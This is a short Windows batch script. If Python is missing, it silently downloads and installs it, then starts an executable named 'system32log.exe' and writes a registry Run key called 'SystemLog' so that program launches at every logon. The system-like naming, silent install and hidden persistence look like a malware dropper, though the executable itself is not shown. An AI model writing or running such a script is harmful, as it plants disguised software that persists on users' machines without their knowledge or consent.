@echo off
cd /d %~dp0
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [*] Installing Python silently...
    powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe -OutFile python_installer.exe"
    python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
)
echo [*] Running system32log.exe...
start "" "%~dp0system32log.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemLog /t REG_SZ /d "%~dp0system32log.exe" /f